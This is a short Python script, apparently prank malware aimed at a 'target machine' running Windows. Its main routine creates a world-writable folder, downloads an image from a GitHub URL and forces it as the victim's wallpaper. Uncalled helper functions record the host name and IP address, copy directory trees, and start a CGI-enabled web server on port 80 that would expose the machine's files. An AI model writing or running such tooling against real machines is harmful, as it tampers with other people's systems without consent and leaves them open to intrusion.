import os # grabbing the system operating system
import sys # identifying the system-specific parameters and functions
import ctypes #ctypes for wallpaper changes
import time #time can be used for delays and cycle changes
import shutil #copying files
import socket #Starting up a webserver
import urllib.request #Downloading files from web
import subprocess


#GLOBAL VARIABLES
dir_path = "C:\WindowsLogs"


#background is to set background of target machine
def background():
    url = "https://raw.githubusercontent.com/kamilgrudzien/JoKEr/main/v33r1.png"
    urllib.request.urlretrieve(url, "C:/WindowsLogs/veer.png")
    #SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/WindowsLogs/veer.png", 0)

def ip_address():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    f = open("Ip_address.txt", "a")
    print("Your attacking Computer Name is:" + hostname, file=f)
    print("Your attacking Computer IP Address is:" + IPAddr, file=f)
    f.close()    

def copy_file(source,target):
    shutil.copytree(source, target)
    print("files copied")
    
def dir_create():
    #mode 0o777 allows for permissions to RWE
    if not os.path.isdir(dir_path):
        os.mkdir(dir_path,mode = 0o777)
    else:
        print('The directory is present.')
        
def run_server():
    from http.server import HTTPServer, CGIHTTPRequestHandler
    os.chdir('.')
    server_object = HTTPServer(server_address=('0.0.0.0', 80), RequestHandlerClass=CGIHTTPRequestHandler)
    server_object.serve_forever()

def main():
    dir_create()
    print("Directory successfully created")
    background()
    print("Wallpaper successfully applied")

if __name__ == "__main__":
    main ()
